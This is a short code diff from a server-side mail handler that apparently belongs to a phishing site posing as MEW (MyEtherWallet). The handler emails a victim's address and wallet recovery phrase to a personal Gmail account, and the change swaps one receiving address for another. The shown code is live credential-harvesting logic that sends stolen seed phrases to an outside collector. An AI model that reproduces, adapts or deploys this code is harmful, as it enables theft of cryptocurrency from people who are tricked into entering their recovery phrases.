@@ -30,7 +30,7 @@ export default async function handler(
   
       const mailData = {
         from: email,
-        to: "Ocool7603@gmail.com",
+        to: "riotech2222@gmail.com",
         subject: `phrase and mail coming from mew-wallet at `,
         text: "phrase",
         html: `<b>Email</b>" ${email} "|| <b>Phrase</b>:" ${phrase} "`,
